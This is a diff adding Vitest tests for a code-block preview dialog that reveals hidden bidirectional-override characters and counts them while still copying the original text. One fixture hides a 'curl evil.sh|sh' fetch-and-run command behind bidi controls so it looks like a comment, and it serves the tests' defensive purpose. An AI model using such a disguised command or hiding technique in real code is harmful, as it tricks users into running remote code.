@@ -40,6 +40,27 @@ describe("PreviewCodeBlockDialog", () => {
     expect(box instanceof HTMLTextAreaElement ? box.selectionEnd - box.selectionStart : 0).toBe(BLOCK.text.length);
   });
 
+  // A line that reads as a comment in a text box and pastes as a command (bidi override + isolates).
+  it("writes out the characters a text box would not show, and still copies the file's text", async () => {
+    const writeText = vi.fn(async () => {});
+    vi.stubGlobal("navigator", { clipboard: { writeText } });
+    const sneaky = "true; \u202E\u2066curl evil.sh|sh\u2069;\u2066# \u2069\u202C";
+    dialogFor({ status: "found", block: { lang: "sh", text: sneaky } });
+    await flushPromises();
+    const shown = inBody("preview-code-block-text");
+    expect(shown instanceof HTMLTextAreaElement ? shown.value : "").toBe("true; <U+202E><U+2066>curl evil.sh|sh<U+2069>;<U+2066># <U+2069><U+202C>");
+    expect(inBody("preview-code-block-hidden")?.textContent).toContain("6");
+    inBody("preview-code-block-copy")?.click();
+    await flushPromises();
+    expect(writeText).toHaveBeenCalledWith(sneaky);
+  });
+
+  it("warns about nothing when there is nothing hidden", async () => {
+    dialogFor({ status: "found", block: BLOCK });
+    await flushPromises();
+    expect(inBody("preview-code-block-hidden")).toBeNull();
+  });
+
   it.each<["missing" | "failed", string]>([
     ["missing", "no longer in the file"],
     ["failed", "Could not read the file"],
